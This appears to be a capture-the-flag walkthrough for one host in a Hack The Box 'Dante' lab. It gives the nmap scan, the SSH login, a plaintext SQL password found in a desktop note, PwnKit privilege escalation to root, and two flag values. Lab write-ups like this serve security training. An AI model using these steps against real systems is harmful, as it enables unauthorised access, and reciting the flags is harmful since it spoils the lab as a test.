# 172.16.2.6 - DANTE-ADMIN-NIX06 Pwn3d!

nmap -sCV -p22 -Pn 172.16.2.6
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-08-19 10:42 EDT
Nmap scan report for 172.16.2.6
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5e:2d:0a:23:be:68:85:ef:a7:63:90:eb:3e:78:c1:fe (RSA)
|   256 0a:a8:21:b8:fe:f2:60:d1:c9:d1:05:32:79:b0:cb:99 (ECDSA)
|_  256 09:25:62:61:f9:5f:4a:48:8d:16:01:39:93:be:17:1e (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
┌─[us-dante-2]─[10.10.14.83]─[ronking37@htb-virjum5mjp]─[~]
└──╼ [★]$ ssh [julian@172.16.2.6](mailto:julian@172.16.2.6)

julian@DANTE-ADMIN-NIX06:~$ls
Desktop    Downloads         flag.txt  Pictures  Templates
Documents  examples.desktop  Music     Public    Videos
julian@DANTE-ADMIN-NIX06:~$ cat flag.txt
DANTE{H1ding_1n_th3_c0rner}

julian@DANTE-ADMIN-NIX06:~/Desktop$ cat SQL
Hi Julian
I've put this on your personal desktop as its probably the most secure
place on the network!

Can you please ask Sophie to change her SQL password when she logs in
again? I've reset it to TerrorInflictPurpleDirt996655 as it stands, but
obviously this is a tough one to remember

Maybe we should all get password managers?

Thanks,
James

julian@DANTE-ADMIN-NIX06:/home$ ls
julian  plongbottom
julian@DANTE-ADMIN-NIX06:/home$ cd plongbottom/

julian@DANTE-ADMIN-NIX06:~$ ./PwnKit
root@DANTE-ADMIN-NIX06:/home/julian# id
uid=0(root) gid=0(root) groups=0(root),1001(julian)
root@DANTE-ADMIN-NIX06:/home/julian# whoami
root

root@DANTE-ADMIN-NIX06:~# cat flag.txt
DANTE{Alw4ys_check_th053_group5}